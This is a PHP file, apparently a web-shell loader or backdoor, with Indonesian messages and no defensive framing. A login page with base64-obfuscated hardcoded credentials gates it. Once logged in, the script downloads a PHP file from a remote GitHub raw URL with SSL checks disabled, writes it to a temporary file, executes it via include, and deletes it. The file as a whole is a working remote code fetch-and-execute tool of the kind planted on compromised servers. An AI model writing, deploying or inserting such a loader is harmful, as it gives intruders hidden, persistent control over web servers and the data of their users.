<?php
session_start();

$encoded_user = 'YWRtaW4=';
$encoded_pass = 'cmFoYXNpYQ==';

$username = base64_decode($encoded_user);
$password = base64_decode($encoded_pass);

if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input_user = trim($_POST['username'] ?? '');
        $input_pass = trim($_POST['password'] ?? '');

        if ($input_user === $username && $input_pass === $password) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Username atau password salah!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Login</title></head>
    <body>
        <h2>Login</h2>
        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
        <form method="POST">
            <label>Username: <input type="text" name="username" required></label><br><br>
            <label>Password: <input type="password" name="password" required></label><br><br>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    <?php
    exit;
}

function ambil_konten($url) {
    $konten = @file_get_contents($url);
    if ($konten !== false) return $konten;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $konten = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode !== 200 || empty($konten)) return false;
    return $konten;
}

$url = "https://raw.githubusercontent.com/soy777/johnygreenwoodsz/main/lotusflower.php";
$konten = ambil_konten($url);

if ($konten === false) {
    die("Gagal mengambil data dari URL.");
}

try {
    ob_start();
    $tmp = tempnam(sys_get_temp_dir(), "kode_");
    file_put_contents($tmp, $konten);
    include $tmp;
    unlink($tmp);
    ob_end_flush();
} catch (Throwable $e) {
    ob_end_clean();
    die("Terjadi kesalahan saat eksekusi kode: " . $e->getMessage());
}
?>